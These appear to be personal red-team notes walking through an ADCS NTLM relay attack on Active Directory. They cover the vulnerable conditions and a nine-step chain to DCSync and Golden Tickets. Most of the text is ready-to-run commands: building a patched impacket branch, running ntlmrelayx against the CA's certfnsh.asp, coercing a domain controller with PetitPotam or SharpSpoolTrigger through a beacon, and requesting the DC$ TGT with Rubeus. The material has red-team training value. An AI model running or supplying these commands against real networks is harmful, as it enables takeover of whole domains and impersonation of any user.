## Conditions
Below are some of the conditions making an AD environment vulnerable to ADCS + NTLM relay attack:

- ADCS is configured to allow NTLM authentication;
- NTLM authentication is not protected by EPA or SMB signing;
- ADCS is running either of these services:
    - Certificate Authority Web Enrollment    
    - Certificate Enrollment Web Service

## Overview

Below provides a high level overview of how the attack works:

1. Get a foothold in an AD network with a misconfigured ADCS instance;
2. Setup an NTLM relay listener on a box you control, so that incoming authentications are relayed to the misconfigured ADCS;
3. Force the target DC to authenticate (using PetitPotam or PrintSpooler trick) to the box running your NTLM relay;
4. Target DC attempts to authenticate to your NTLM relay;
5. NTLM relay receives the DC$ machine account authentication and relays it to the ADCS;
6. ADCS provides a certificate for the target DC$ computer account;
7. Use the target DC's computer account certificate to request its Kerberos TGT;
8. Use target DC's computer account TGT to perform [DCSync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync) and pull the NTLM hash of `krbtgt`;
9. Use `krbtgt` NTLM hash to create [Golden Tickets](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets) that allow you to impersonate any domain user, including Domain Admin.


Install tools
```
git clone https://github.com/ExAndroidDev/impacket.git
cd impacket
git checkout ntlmrelayx-adcs-attack
```
```
apt install python3-venv
```
```
python3 -m venv impacket
source impacket/bin/activate
```
```
pip install .
```
On `WS01`, we can use a Windows LOLBIN `certutil.exe`, to find ADCS servers in the domain:
![[image 17.avif]]
start relay
```
examples/ntlmrelayx.py -t http://ca01/certsrv/certfnsh.asp -smb2support --adcs
```
From `WS01`, let's force the `DC01` to authenticate to our NTLM relay at 10.0.0.5 by executing PetitPotam
https://github.com/topotam/PetitPotam
```
.\PetitPotam.exe 10.0.0.5 dc01
```
You can also force it with SharpSpoolsTrigger
```
beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe 10.0.0.5 dc01
```
![[image 18.avif]]
On `WS01`, we can now use `rubeus` to request a Kerberos TGT for the `DC01$` computer account like so:

```
.\Rubeus.exe asktgt /outfile:kirbi /user:dc01$ /ptt /certificate:MIIRd[...]
```